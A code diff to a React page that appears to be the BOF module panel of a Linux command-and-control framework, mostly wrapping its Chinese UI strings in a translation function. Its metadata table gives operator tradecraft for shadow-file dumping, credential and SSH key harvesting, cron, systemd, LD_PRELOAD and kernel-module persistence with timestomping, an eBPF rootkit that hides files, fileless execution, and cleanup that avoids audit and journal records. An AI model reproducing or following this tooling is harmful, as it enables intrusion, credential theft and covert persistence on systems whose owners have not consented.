@@ -56,42 +56,42 @@ type BofMeta = { category: Cat; desc: string; notes?: string[]; params?: ParamDe
 const META: Record<string, BofMeta> = {
   // ── 侦察 ──
   host_recon: {
-    category: 'recon', desc: '主机信息汇总：内核/发行版/CPU/内存/网卡/用户',
+    category: 'recon', desc: t('主机信息汇总：内核/发行版/CPU/内存/网卡/用户'),
     notes: [
       '只读、不落盘，任何时候都能安全重跑；回执很长（含用户/组/登录历史/crontab）',
       '拿到的内核版本是选提权路线的输入 —— 接着喂给 kernel_exploit_check',
     ],
   },
   proc_enum: {
-    category: 'recon', desc: '枚举全部进程（PID/PPID/路径/用户）',
+    category: 'recon', desc: t('枚举全部进程（PID/PPID/路径/用户）'),
     notes: [
       '只读 /proc：线程 / fd / cmdline / maps / cwd，输出量很大',
       '动手做持久化之前先看这里：有没有 EDR、auditd、抓包进程在盯',
     ],
   },
   net_enum: {
-    category: 'recon', desc: '网络枚举：接口/路由/监听端口',
+    category: 'recon', desc: t('网络枚举：接口/路由/监听端口'),
     notes: [
       '只读：接口 / 路由 / ARP / DNS / 连接表',
       '横向前的第一步；配合 ebpf_load 的 ports 参数，确认哪些端口已经藏起来',
     ],
   },
   service_enum: {
-    category: 'recon', desc: '服务枚举：systemd 单元/开机项',
+    category: 'recon', desc: t('服务枚举：systemd 单元/开机项'),
     notes: [
       '只读：systemd 单元 + init 脚本，用来找能借壳的常驻服务',
       '装 systemd_persist 之前先跑一遍，留一份"原本长什么样"的基线',
     ],
   },
   container_detect: {
-    category: 'recon', desc: '容器/虚拟化环境检测',
+    category: 'recon', desc: t('容器/虚拟化环境检测'),
     notes: [
       '只读：判断在不在容器/虚拟机里，并给出逃逸线索',
       '容器里做的持久化重启即失 —— 先确认自己在哪一层，再决定往哪落',
     ],
   },
   kernel_exploit_check: {
-    category: 'recon', desc: '内核版本 vs 已知提权 exploit 匹配',
+    category: 'recon', desc: t('内核版本 vs 已知提权 exploit 匹配'),
     notes: [
       '只读：内核版本 vs 内置提权 CVE 表（含 DirtyPipe 等）',
       '★ 回执末尾那行 MATRIX:kver=…|btf=…|kconfig=… 是喂给载荷矩阵解析器的，别丢',
@@ -99,28 +99,28 @@ const META: Record<string, BofMeta> = {
   },
   // ── 提权 ──
   sudo_check: {
-    category: 'priv', desc: 'sudo 配置检查（-l / 无密码项 / env_keep）',
+    category: 'priv', desc: t('sudo 配置检查（-l / 无密码项 / env_keep）'),
     notes: [
       '只读解析 sudoers，不改配置；等价于 sudo -l 但不产生 execve',
       '重点看 NOPASSWD 项和 env_keep —— LD_PRELOAD/PYTHONPATH 类可以直接提权',
     ],
   },
   suid_scan: {
-    category: 'priv', desc: 'SUID 二进制扫描（GTFOBins 候选）',
+    category: 'priv', desc: t('SUID 二进制扫描（GTFOBins 候选）'),
     notes: [
       '只读，但要遍历整个文件系统 —— 慢，建议勾异步 -a',
       '命中的二进制会直接标出 GTFOBins 用法',
     ],
   },
   ld_preload_check: {
-    category: 'priv', desc: 'LD_PRELOAD 利用面检查',
+    category: 'priv', desc: t('LD_PRELOAD 利用面检查'),
     notes: [
       '只读：LD_PRELOAD 环境变量 + /etc/ld.so.preload + 可疑 .so',
       '装 ld_preload_install 前后各跑一次，确认落点、也确认没被别人占坑',
     ],
   },
   shadow_dump: {
-    category: 'priv', desc: '读取 /etc/shadow（需 root）',
+    category: 'priv', desc: t('读取 /etc/shadow（需 root）'),
     notes: [
       '★ 需要 root：非 root 直接报错返回，不会给半截数据',
       '拿到就离线破解；在线爆破会在目标机上留 auth 日志，别在那台机上做',
@@ -128,14 +128,14 @@ const META: Record<string, BofMeta> = {
   },
   // ── 凭据 ──
   cred_harvest: {
-    category: 'cred', desc: '凭据收集：history/bashrc/env/常见密钥',
+    category: 'cred', desc: t('凭据收集：history/bashrc/env/常见密钥'),
     notes: [
       '★ 要扫全部用户需要 root；非 root 只能看当前用户的',
       '比内置 creds 多扫 terraform / vault / npm / pip / git，并提取云 IMDS 地址',
     ],
   },
   ssh_keys: {
-    category: 'cred', desc: 'SSH 私钥/authorized_keys 收集',
+    category: 'cred', desc: t('SSH 私钥/authorized_keys 收集'),
     notes: [
       '★ 要覆盖全部用户需要 root',
       '拿到私钥顺手看 known_hosts —— 那是一张现成的横向地图',
@@ -143,19 +143,19 @@ const META: Record<string, BofMeta> = {
   },
   // ── 维持 ──
   cron_persist: {
-    category: 'persist', desc: 'crontab 持久化（含 timestomp）',
+    category: 'persist', desc: t('crontab 持久化（含 timestomp）'),
     notes: [
       '落 /etc/cron.d/<任务名>（默认 sys-update），chmod 0600 且 mtime 对齐目录 mtime',
       '★ 落地产物在"加载之后"才出现，ebpf_load 的 names 覆盖不到 —— 本命令会自己补登记进 hide_names',
       '现代发行版可能根本没装 cron（Ubuntu 24.04 默认无）——先 service_enum 确认',
     ],
     params: [
-      { key: 'command', label: '命令', placeholder: '/tmp/x', required: true },
+      { key: 'command', label: t('命令'), placeholder: '/tmp/x', required: true },
       { key: 'job_name', label: '任务名', placeholder: 'agent_update' },
     ],
   },
   ssh_persist: {
-    category: 'persist', desc: 'authorized_keys 后门（追加公钥）',
+    category: 'persist', desc: t('authorized_keys 后门（追加公钥）'),
     notes: [
       '默认写 /root/.ssh/authorized_keys（目录 0700 / 文件 0600）；第二参数给 AuthorizedKeysFile 非默认位置的机器用',
       '★ 刻意**不**把 authorized_keys 登记进 hide_names：它看不见反而反常，是判断不是遗漏',
@@ -167,7 +167,7 @@ const META: Record<string, BofMeta> = {
     ],
   },
   ld_preload_install: {
-    category: 'persist', desc: 'LD_PRELOAD 劫持安装（.so 需已投递到目标机）',
+    category: 'persist', desc: t('LD_PRELOAD 劫持安装（.so 需已投递到目标机）'),
     notes: [
       '★ .so 必须**已经投递到目标机**上，本命令只负责把路径写进 /etc/ld.so.preload',
       'ld.so.preload 在发行版里默认不存在，它的出现本身就是 IOC —— 本命令会自己把它登记进 hide_names',
@@ -176,7 +176,7 @@ const META: Record<string, BofMeta> = {
     params: [{ key: 'so_path', label: '目标机 .so 路径', placeholder: '/tmp/evil.so', required: true }],
   },
   ko_load: {
-    category: 'persist', desc: '内核模块加载（finit_module，.ko 需已投递）',
+    category: 'persist', desc: t('内核模块加载（finit_module，.ko 需已投递）'),
     notes: [
       '★ .ko 必须与目标内核 vermagic 匹配（由载荷矩阵挑选），不是随便一个 .ko',
       '需要 CAP_SYS_MODULE；lockdown / 模块签名强制会挡，报错码能区分原因',
@@ -186,7 +186,7 @@ const META: Record<string, BofMeta> = {
     params: [{ key: 'ko_path', label: '目标机 .ko 路径', placeholder: '/tmp/rootkit.ko', required: true }],
   },
   ebpf_load: {
-    category: 'persist', desc: 'eBPF 程序加载（原始指令流，九个位置参数）',
+    category: 'persist', desc: t('eBPF 程序加载（原始指令流，九个位置参数）'),
     notes: [
       '★ 必须勾异步 -a：加载 + attach 是长任务，同步会卡住 agent 的命令循环',
       'insns.bin / mapreloc 由 build_bpf.sh 产出，必须先投递到目标机',
@@ -206,7 +206,7 @@ const META: Record<string, BofMeta> = {
     ],
   },
   systemd_persist: {
-    category: 'persist', desc: 'systemd timer 持久化单元',
+    category: 'persist', desc: t('systemd timer 持久化单元'),
     notes: [
       '落地三件缺一不可：<名>.service + <名>.timer + timers.target.wants/<名>.timer 符号链接；少一个链接就是"看得见但永远不会跑"',
       '★ 不 execve systemctl enable / daemon-reload（少一条 execve 审计 + 一条 journal 记录）；要本次就生效得自己在目标机上 reload',
@@ -214,13 +214,13 @@ const META: Record<string, BofMeta> = {
       '单元文件 mtime 对齐目录，且带 RandomizedDelaySec（真实发行版定时器的常见形态）',
     ],
     params: [
-      { key: 'command', label: '命令', placeholder: '/tmp/x', required: true },
+      { key: 'command', label: t('命令'), placeholder: '/tmp/x', required: true },
       { key: 'unit_name', label: '单元名', placeholder: 'sys-maintenance' },
     ],
   },
   // ── 执行 ──
   memfd_exec: {
-    category: 'exec', desc: '无文件执行 ELF（fork 隔离；路径是目标机上的）',
+    category: 'exec', desc: t('无文件执行 ELF（fork 隔离；路径是目标机上的）'),
     notes: [
       '载荷在**子进程**里跑：它崩了不会带走 agent；但父进程会 waitpid 到载荷退出为止',
       '载体首选 tmpfs 文件（写完立刻 unlink），memfd 只是拿不到 tmpfs 时的回退',
@@ -232,7 +232,7 @@ const META: Record<string, BofMeta> = {
     ],
   },
   spawn_detached: {
-    category: 'exec', desc: '把 ELF 丢成"无父、无盘、无 fd"的后台进程',
+    category: 'exec', desc: t('把 ELF 丢成"无父、无盘、无 fd"的后台进程'),
     notes: [
       '★ 路径是**目标机上已有的** ELF；默认跑完立刻 unlink 源，--keep 只用于测试',
       '★ 父进程只等中间子进程（秒退），不等载荷 —— agent 不会被拖住，载荷活多久都不影响心跳',
@@ -245,20 +245,20 @@ const META: Record<string, BofMeta> = {
     ],
   },
   matrix_pick: {
-    category: 'exec', desc: '载荷矩阵查表与完整性校验',
+    category: 'exec', desc: t('载荷矩阵查表与完整性校验'),
     notes: [
       '校验模式：<manifest 路径> <sha256> <本地文件> → 打 MATRIX_OK / MATRIX_BAD / MATRIX_MISSING',
       '★ 本地这一侧的 sha256 目前是简化占位实现，真正的完整性闸门在服务端 resolver + 下载通道',
     ],
     params: [
-      { key: 'kver', label: '内核版本', placeholder: '6.8.0', required: true },
-      { key: 'arch', label: '架构', placeholder: 'x86_64', required: true },
-      { key: 'kind', label: '类型', placeholder: 'exploit', required: true },
+      { key: 'kver', label: t('内核版本'), placeholder: '6.8.0', required: true },
+      { key: 'arch', label: t('架构'), placeholder: 'x86_64', required: true },
+      { key: 'kind', label: t('类型'), placeholder: 'exploit', required: true },
     ],
   },
   // ── 隐匿 · 撤离 ──
   hide_add: {
-    category: 'stealth', desc: '事后往 hide_names 补写要隐藏的名字',
+    category: 'stealth', desc: t('事后往 hide_names 补写要隐藏的名字'),
     notes: [
       '名字填 dirent 名（文件名/目录名），**不是路径**；多个名字用空格分开',
       '★ 表上限 32 且没有 LRU：写满了 MAP_UPDATE 只返 -1，表现出来就是"隐藏莫名失灵"',
@@ -270,7 +270,7 @@ const META: Record<string, BofMeta> = {
     ],
   },
   hide_del: {
-    category: 'stealth', desc: '从 hide_names 删回名字（恢复可见 / 回收预算）',
+    category: 'stealth', desc: t('从 hide_names 删回名字（恢复可见 / 回收预算）'),
     notes: [
       '只删键、不删对象 —— 删完那个名字重新出现在 ls 里，文件一直都在',
       '★ 要在 pin 还活着的时候用：unpin 之后再按路径就打不开那张 map 了',
@@ -282,7 +282,7 @@ const META: Record<string, BofMeta> = {
     ],
   },
   ebpf_unload: {
-    category: 'stealth', desc: 'eBPF rootkit 的失效保护卸载',
+    category: 'stealth', desc: t('eBPF rootkit 的失效保护卸载'),
     notes: [
       '★ 顺序是**先 close 再 unlink**：pin 一旦 unlink，里面的 perf fd 就再也取不回来',
       '★ 排在 evacuate **之后**跑：先把落盘物删干净，最后再恢复可见',
@@ -294,7 +294,7 @@ const META: Record<string, BofMeta> = {
     ],
   },
   evacuate: {
-    category: 'stealth', desc: '现场复原 / 撤离（按显式清单删落盘物）',
+    category: 'stealth', desc: t('现场复原 / 撤离（按显式清单删落盘物）'),
     notes: [
       "spec 用 ';' 分隔、**按给定顺序**执行：cron:<名> / systemd:<名> / preload:<so路径> / rm:<路径>",
       '幂等：每一步的 ENOENT 都算成功，可以重复下发',
@@ -310,7 +310,7 @@ const META: Record<string, BofMeta> = {
   },
   // ── 其他 ──
   argprobe: {
-    category: 'other', desc: '参数编解码探针（零副作用）',
+    category: 'other', desc: t('参数编解码探针（零副作用）'),
     notes: [
       '只打印参数 blob 的头 4 字节 + 逐个 token；不写盘、不加载 eBPF、不改进程属性',
       '★ 用来判定参数通道有没有 4 字节错位：正常时 head4 应当等于"字段个数"',
@@ -319,18 +319,18 @@ const META: Record<string, BofMeta> = {
 }
 
 const CATS: { key: Cat; label: string }[] = [
-  { key: 'recon', label: '侦察' },
+  { key: 'recon', label: t('侦察') },
   { key: 'priv', label: '提权' },
-  { key: 'cred', label: '凭据' },
+  { key: 'cred', label: t('凭据') },
   { key: 'persist', label: '维持' },
   { key: 'stealth', label: '隐匿 · 撤离' },
-  { key: 'exec', label: '执行' },
+  { key: 'exec', label: t('执行') },
   { key: 'other', label: '其他' },
 ]
 
 const UNKNOWN_META: BofMeta = {
   category: 'other',
-  desc: '服务端存在、但本地 META 表里没有描述。可能是新加的，或你自己上传的。',
+  desc: t('服务端存在、但本地 META 表里没有描述。可能是新加的，或你自己上传的。'),
   // 没有参数表 ⇒ 本页只会把「路径」发出去。这不是缺陷而是**保守**：
   // 编不出参数流时宁可一个字段都不发，也不要按猜测的格式发一串错位的垃圾。
   notes: [
@@ -562,7 +562,7 @@ export function Bofs() {
   async function runBof(b: BofRow) {
     const id = effectiveAgent
     if (!id) { pushToast('warn', '没有在线主机可选'); return }
-    if (!api) { pushToast('err', 'API 未就绪'); return }
+    if (!api) { pushToast('err', t('API 未就绪')); return }
     if (!b.obj && !offline) { pushToast('warn', `${b.name}.o 在服务端不存在，先编译或上传`); return }
     for (const p of b.meta.params || []) {
       if (p.required && !p.flag && !val(b, p.key)) {
@@ -613,7 +613,7 @@ export function Bofs() {
 
   async function copyCmd(b: BofRow) {
     const ok = await copyText(buildCmdline(b))
-    pushToast(ok ? 'ok' : 'err', ok ? '命令已复制' : '复制失败')
+    pushToast(ok ? 'ok' : 'err', ok ? '命令已复制' : t('复制失败'))
   }
 
   async function onPickFile(ev: React.ChangeEvent<HTMLInputElement>) {
@@ -719,13 +719,13 @@ export function Bofs() {
         <span className="dim" style={{ fontSize: 12 }}>
           {offline
             ? `离线兜底：${rows.length} 个（未与服务端核对）`
-            : `服务端 ${rows.length} 个 · 可执行 ${nObj}${nStale ? ` · 源码已改 ${nStale}` : ''}${nOther ? ` · 未登记 ${nOther}` : ''}`}
+            : `Server ${rows.length} · executable ${nObj}${nStale ? ` · src-changed ${nStale}` : ''}${nOther ? ` · unregistered ${nOther}` : ''}`}
         </span>
         <span style={{ flex: 1 }} />
         <select
           value={effectiveAgent}
           onChange={(e) => setAgentId(e.target.value)}
-          title="目标主机（仅在线）"
+          title={t('目标主机（仅在线）')}
         >
           {onlineAgents.length === 0 && <option value="">{t('无在线主机')}</option>}
           {onlineAgents.map((a: any) => (
@@ -734,8 +734,8 @@ export function Bofs() {
             </option>
           ))}
         </select>
-        <button type="button" className="ghost" onClick={() => { void load(); invalidateCompletions() }} disabled={loading || !api} title="重新拉取服务端 BOF 清单（并让命令补全同步失效）">
-          {loading ? '…' : '刷新'}
+        <button type="button" className="ghost" onClick={() => { void load(); invalidateCompletions() }} disabled={loading || !api} title={t('重新拉取服务端 BOF 清单（并让命令补全同步失效）')}>
+          {loading ? '…' : t('刷新')}
         </button>
         <input
           className="bof-base"
@@ -743,18 +743,18 @@ export function Bofs() {
           onChange={(e) => setBase(e.target.value)}
           onBlur={saveBase}
           placeholder={serverBase || '/root/cc/run/extenders/linux_agent/bofs/'}
-          title="BOF .o 文件在团队服务器上的目录；留空 = 跟随服务端返回的 base"
+          title={t('BOF .o 文件在团队服务器上的目录；留空 = 跟随服务端返回的 base')}
           style={{ width: 200, fontFamily: 'var(--mono)', fontSize: 12 }}
         />
         {base.trim() && (
-          <button type="button" className="ghost" onClick={() => { setBase(''); try { localStorage.removeItem(BASE_KEY) } catch { /* ignore */ } pushToast('ok', '已改为跟随服务端') }} title="清空本地覆盖，改用服务端返回的 base">
+          <button type="button" className="ghost" onClick={() => { setBase(''); try { localStorage.removeItem(BASE_KEY) } catch { /* ignore */ } pushToast('ok', '已改为跟随服务端') }} title={t('清空本地覆盖，改用服务端返回的 base')}>
             跟随服务端
           </button>
         )}
         <input
           value={search}
           onChange={(e) => setSearch(e.target.value)}
-          placeholder="搜索 BOF…"
+          placeholder={t('搜索 BOF…')}
           style={{ width: 130 }}
         />
         <input
@@ -765,27 +765,27 @@ export function Bofs() {
           onChange={(e) => void onPickFile(e)}
         />
         <button type="button" className="ghost" disabled={uploading || !api} onClick={() => fileRef.current?.click()} title={t('上传 .c（自动编译）或 .o（直接投递）')}>
-          {uploading ? '上传中…' : '上传 BOF'}
+          {uploading ? '上传中…' : t('上传 BOF')}
         </button>
-        <button type="button" className="ghost" disabled={compileAll || !api} onClick={() => void compileEvery()} title="把服务端 src_agent/bofs/*.c 全部重编一遍">
+        <button type="button" className="ghost" disabled={compileAll || !api} onClick={() => void compileEvery()} title={t('把服务端 src_agent/bofs/*.c 全部重编一遍')}>
           {compileAll ? '重编中…' : '全部重编'}
         </button>
         <PageTips id="bofs">
-          <p>BOF 在 <b>agent 进程内</b>执行（内存加载 .o，无 execve 痕迹）。</p>
-          <p>列表<b>由服务端 <code>/api/bofs/list</code> 动态给出</b>——服务端有几个就显示几个，新增或上传的会自动出现。</p>
-          <p><code>基路径</code>默认跟随服务端；<code>memfd_exec / ld_preload_install / ko_load / ebpf_load</code> 的路径参数则是<b>目标机</b>上的路径。</p>
-          <p>{t('上传')} <code>.c</code> 会<b>自动编译</b>：配方与 <code>tools/deploy.sh</code> 的 gcc 命令行逐字同源，所以重编未改动的源码产物字节不变。</p>
-          <p><b>{t('执行')}</b>后自动打开该主机的控制台查看输出；勾选<b>{t('异步')}</b>适合长任务（ebpf_load / suid_scan 建议异步）。</p>
-          <p>卡上的 <b>▸ 用法</b>是各模块 <code>.c</code> 头注释里的实战约束；带 <span className="bof-hot-mark">★</span> 的那条忽略了会静默出错或不可逆。</p>
-          <p>控制台等价命令：<code>execute bof &lt;服务器路径&gt; [参数...] [async]</code>。开关标记名随 agent 变（linux 是 <code>async</code>，beacon 是 <code>-a</code>）；写错不会报错，而会被并进前一个参数里。</p>
+          <p>{t('BOF 在')} <b>agent 进程内</b>{t('执行（内存加载 .o，无 execve 痕迹）。')}</p>
+          <p>{t('列表')}<b>{t('由服务端')} <code>/api/bofs/list</code> {t('动态给出')}</b>{t('——服务端有几个就显示几个，新增或上传的会自动出现。')}</p>
+          <p><code>{t('基路径')}</code>{t('默认跟随服务端；')}<code>memfd_exec / ld_preload_install / ko_load / ebpf_load</code> {t('的路径参数则是')}<b>{t('目标机')}</b>{t('上的路径。')}</p>
+          <p>{t('上传')} <code>.c</code> {t('会')}<b>{t('自动编译')}</b>{t('：配方与')} <code>tools/deploy.sh</code> {t('的 gcc 命令行逐字同源，所以重编未改动的源码产物字节不变。')}</p>
+          <p><b>{t('执行')}</b>{t('后自动打开该主机的控制台查看输出；勾选')}<b>{t('异步')}</b>{t('适合长任务（ebpf_load / suid_scan 建议异步）。')}</p>
+          <p>{t('卡上的')} <b>{t('▸ 用法')}</b>{t('是各模块')} <code>.c</code> {t('头注释里的实战约束；带')} <span className="bof-hot-mark">★</span> {t('的那条忽略了会静默出错或不可逆。')}</p>
+          <p>{t('控制台等价命令：')}<code>execute bof &lt;server path&gt; [参数...] [async]</code>{t('。开关标记名随 agent 变（linux 是')} <code>async</code>{t('，beacon 是')} <code>-a</code>{t('）；写错不会报错，而会被并进前一个参数里。')}</p>
         </PageTips>
       </div>
 
       {offline && (
         <div className="banner warn" style={{ marginBottom: 10 }}>
-          拿不到服务端 BOF 清单（{listErr || '未知原因'}）。下面是<b>离线兜底列表</b>，每条都假定 <code>.o</code> 已存在且<b>未经核对</b>；
+          拿不到服务端 BOF 清单（{listErr || '未知原因'}）。下面是<b>{t('离线兜底列表')}</b>{t('，每条都假定')} <code>.o</code> {t('已存在且')}<b>{t('未经核对')}</b>；
           执行前请先确认服务器上确有该文件。
-          <button type="button" className="ghost" style={{ marginLeft: 8 }} onClick={() => void load()}>重试</button>
+          <button type="button" className="ghost" style={{ marginLeft: 8 }} onClick={() => void load()}>{t('重试')}</button>
         </div>
       )}
 
@@ -794,7 +794,7 @@ export function Bofs() {
           <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
             <b>{out.title}</b>
             <span style={{ flex: 1 }} />
-            <button type="button" className="ghost" onClick={() => void copyText(out.text).then((ok) => pushToast(ok ? 'ok' : 'err', ok ? '已复制' : '复制失败'))}>{t('复制')}</button>
+            <button type="button" className="ghost" onClick={() => void copyText(out.text).then((ok) => pushToast(ok ? 'ok' : 'err', ok ? '已复制' : t('复制失败')))}>{t('复制')}</button>
             <button type="button" className="ghost" onClick={() => setOut(null)}>{t('关闭')}</button>
           </div>
           <pre className="mono" style={{ margin: '6px 0 0', maxHeight: 220, overflow: 'auto', fontSize: 11, whiteSpace: 'pre-wrap' }}>{out.text || '(空)'}</pre>
@@ -815,10 +815,10 @@ export function Bofs() {
                       <span className="bof-name">{b.name}</span>
                       <span className="dim mono" style={{ fontSize: 11 }}>{b.file}</span>
                       <span style={{ flex: 1 }} />
-                      {!offline && !b.obj && <span className="dim" style={{ fontSize: 11, color: 'var(--warn, #d08770)' }} title="服务端 bofs/ 下没有这个 .o，无法执行">未编译</span>}
-                      {!offline && b.obj && !b.src && <span className="dim" style={{ fontSize: 11 }} title="服务端没有对应 .c，只能执行不能重编">无源码</span>}
-                      {!offline && b.stale && <span className="dim" style={{ fontSize: 11, color: 'var(--warn, #d08770)' }} title=".c 比 .o 新，产物可能已过期">源码已改</span>}
-                      <label className="bof-async" title="异步执行（长任务）：走 COMMAND_EXEC_BOF_ASYNC，不阻塞 agent 的命令循环">
+                      {!offline && !b.obj && <span className="dim" style={{ fontSize: 11, color: 'var(--warn, #d08770)' }} title={t('服务端 bofs/ 下没有这个 .o，无法执行')}>{t('未编译')}</span>}
+                      {!offline && b.obj && !b.src && <span className="dim" style={{ fontSize: 11 }} title={t('服务端没有对应 .c，只能执行不能重编')}>{t('无源码')}</span>}
+                      {!offline && b.stale && <span className="dim" style={{ fontSize: 11, color: 'var(--warn, #d08770)' }} title={t('.c 比 .o 新，产物可能已过期')}>{t('源码已改')}</span>}
+                      <label className="bof-async" title={t('异步执行（长任务）：走 COMMAND_EXEC_BOF_ASYNC，不阻塞 agent 的命令循环')}>
                         <input
                           type="checkbox"
                           checked={!!asyncOn[b.name]}
@@ -829,7 +829,7 @@ export function Bofs() {
                     </div>
                     {/* 「未登记」是**每张卡自己的状态**（服务端有这个 .o、本地 META 没有条目），
                         不该靠分类名去表达 —— 分类名说的事跟它无关。 */}
-                    {!b.known && <span className="bof-unknown" title="服务端有这个 .o，但本地 META 表里没有它的描述/参数表。下面显示的参数框是空的，本页只会把「路径」发出去。">未登记</span>}
+                    {!b.known && <span className="bof-unknown" title={t('服务端有这个 .o，但本地 META 表里没有它的描述/参数表。下面显示的参数框是空的，本页只会把「路径」发出去。')}>{t('未登记')}</span>}
                     <div className="bof-desc">{b.meta.desc}</div>
                     {(b.meta.notes || []).length > 0 && (
                       <ul className="bof-notes">
@@ -859,9 +859,9 @@ export function Bofs() {
                       <div key={p.key} className="bof-param">
                         <label>
                           {p.label}{p.required ? ' *' : ''}
-                          {p.multi ? <span className="bof-hint" title="空格分隔，每个值发成一个独立字段">多个</span>
-                            : p.nulJoin ? <span className="bof-hint" title="空格分隔，合并成一个字段、值之间用 NUL 连接">NUL 连接</span>
-                              : p.kind === 'int' ? <span className="bof-hint" title="按裸 4 字节整数编码（BeaconDataInt），不是字符串">整数</span> : null}
+                          {p.multi ? <span className="bof-hint" title={t('空格分隔，每个值发成一个独立字段')}>{t('多个')}</span>
+                            : p.nulJoin ? <span className="bof-hint" title={t('空格分隔，合并成一个字段、值之间用 NUL 连接')}>{t('NUL 连接')}</span>
+                              : p.kind === 'int' ? <span className="bof-hint" title={t('按裸 4 字节整数编码（BeaconDataInt），不是字符串')}>{t('整数')}</span> : null}
                         </label>
                         <input
                           value={paramVals[`${b.name}.${p.key}`] || ''}
@@ -873,7 +873,7 @@ export function Bofs() {
                     <div className="bof-card-foot">
                       <code className="bof-usage">{buildCmdline(b)}</code>
                       <span style={{ flex: 1 }} />
-                      <button type="button" className="ghost" onClick={() => void copyCmd(b)}>复制命令</button>
+                      <button type="button" className="ghost" onClick={() => void copyCmd(b)}>{t('复制命令')}</button>
                       <button
                         type="button"
                         className="ghost"
@@ -890,7 +890,7 @@ export function Bofs() {
                         onClick={() => void runBof(b)}
                         title={!effectiveAgent ? '没有在线主机' : `在 ${effectiveAgent} 上执行`}
                       >
-                        {busy === b.name ? '…' : '执行'}
+                        {busy === b.name ? '…' : t('执行')}
                       </button>
                     </div>
                   </div>
@@ -902,8 +902,8 @@ export function Bofs() {
         {filtered.length === 0 && (
           <EmptyState
             icon="⎔"
-            title={rows.length ? '无匹配 BOF' : '服务端还没有 BOF'}
-            hint={rows.length ? '换个搜索词' : '用上方「上传 BOF」投递一个 .c（会自动编译）或 .o'}
+            title={rows.length ? t('无匹配 BOF') : t('服务端还没有 BOF')}
+            hint={rows.length ? t('换个搜索词') : t('用上方「上传 BOF」投递一个 .c（会自动编译）或 .o')}
           />
         )}
         {onlineAgents.length === 0 && (
